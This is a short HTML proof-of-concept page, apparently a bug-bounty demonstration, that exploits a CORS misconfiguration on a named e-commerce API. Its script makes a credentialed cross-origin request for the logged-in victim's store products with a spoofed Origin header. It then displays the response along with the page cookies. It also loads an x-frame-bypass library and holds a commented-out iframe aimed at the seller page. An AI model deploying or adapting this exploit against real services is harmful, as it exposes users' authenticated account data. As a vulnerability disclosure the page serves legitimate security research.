<script src="https://unpkg.com/@ungap/custom-elements-builtin"></script>
<script type="module" src="https://unpkg.com/x-frame-bypass"></script>
<!-- <iframe is="x-frame-bypass" src="https://seller.bukalapak.com/product/new"></iframe> -->
<script>
var x = new XMLHttpRequest();

  x.onreadystatechange = function() {
    if (x.readyState == XMLHttpRequest.DONE) {
      var r = x.response + document.cookie;
      var headers = XMLHttpRequest.getAllResponseHeaders();
      document.getElementById('z').innerHTML = r + headers;
    }
  }

function cors(){
  if(x) {
    x.open('GET', 'https://api.bukalapak.com/stores/me/products', true);
    x.withCredentials = true;
    x.setRequestHeader("Origin", "https://irvandikky.github.io");
    x.send();
  }
}
cors();
</script>
<div id=z>
</div>
